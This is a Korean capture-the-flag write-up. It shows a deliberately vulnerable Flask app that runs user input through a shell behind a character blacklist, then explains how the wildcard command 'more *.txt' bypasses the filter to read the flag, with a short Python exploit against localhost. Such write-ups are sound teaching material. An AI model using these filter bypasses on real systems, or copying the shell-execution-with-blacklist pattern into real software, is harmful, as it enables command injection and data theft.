# 문제이름
flagreading
# Usage
- 공란

# Concept
- command injection Filtering Bypass

# Writeup
코드를 살펴보자
```python
from flask import Flask, render_template, request
import subprocess
import re
import time

app = Flask(__name__)
blacklist = set('flag/')
command_executed = False
last_execution_time = 0

def is_valid_command(command):
    if any(char in blacklist for char in command):
        return False
    return True

def execute_command(command):
    try:
        result = subprocess.run(command, shell=True, capture_output=True, text=True)
        output = result.stdout.strip()
        error = result.stderr.strip()
        if output:
            return output
        if error:
            return error
    except Exception as e:
        return str(e)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/execute_command', methods=['POST'])
def execute_command_route():
    global command_executed, last_execution_time
    current_time = time.time()
    if command_executed and (current_time - last_execution_time) < 30:
        time_left = 30 - (current_time - last_execution_time)
        return f"You've already executed a command! Please wait {int(time_left)} seconds before trying again."
    command = request.form['command']
    if not is_valid_command(command):
        return "try harder!"
    result = execute_command(command)
    command_executed = True
    last_execution_time = current_time
    return result

if __name__ == '__main__':
    app.run(debug=True, port=5678)

```
이 코드는 블랙리스트에 있는단어를 제외한 명령어를 실행시켜주는 쉘이다
블랙리스트엔 f , l , a , g ,/가 등록되어있다
그래서 우린 cat이라는 명령어를 사용할수도없고 flag라는 단어를 사용도 못한다
자 다른명령어를 서칭해보자
more이라는 명령어를 찾았다
more명령어는 긴 파일을 한 페이지씩 보여주는 명령어이다
그리고 flag라는걸 읽어와야하는데
우리는 와일드카드문자를 사용해서 읽어올수있다
그래서 우리는 와일드카드문자 *을 사용해서 flag라는 문자열을 우회할수있다
따라서 more *.txt라는 명령어를 사용한다면
모든 txt파일을 다 읽어와서 flag를 얻을수있게된다
```python
import requests
url= 'http://localhost:5678/execute_command'

command = 'more *.txt'

response = requests.post(url, data={'command': command})

result = response.text
print(result)
```
익스플로잇코드이다